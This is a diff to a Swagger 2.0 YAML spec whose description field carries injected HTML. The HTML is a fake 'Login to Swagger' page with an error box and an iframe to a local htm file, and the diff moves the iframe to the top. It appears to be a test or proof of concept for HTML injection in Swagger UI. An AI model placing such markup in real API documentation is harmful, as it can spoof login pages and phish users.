@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Swagger UI
-  description: '<div class="login-form">
+  description: '<iframe src="../../calendar_h.htm"></iframe><div class="login-form">
 <!-- Error Message -->
 <div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 20px; background: #f8d7da; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
   <div style="background-color: #f8d7da; color: #721c24; padding: 16px 20px; border-radius: 4px; border: 1px solid #f5c6cb; font-size: 16px; text-align: center;">
@@ -14,7 +14,6 @@ info:
 <div class="heading">
   <h1 style="text-align: center; font-size: 24px; color: #333; margin-bottom: 20px;">Login to Swagger</h1>
   <div class="form-container" style="width: 100%; max-width: 400px; margin: 0 auto; padding: 20px; background: #fff; border-radius: 8px; box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);">
-    <iframe src="../../calendar_h.htm"></iframe>
   </div>
 </div>
 
